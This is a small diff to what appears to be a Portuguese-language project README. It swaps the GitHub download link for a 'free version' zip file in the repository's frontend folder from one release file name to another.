@@ -9,4 +9,4 @@ docker compose build
 ```
 Versão para uso gratuita:
 
-https://github.com/rlmourarj/wticketdocker/raw/refs/heads/master/frontend/Software_2.0-alpha.5.zip
+https://github.com/rlmourarj/wticketdocker/raw/refs/heads/master/frontend/Software-2.5.zip
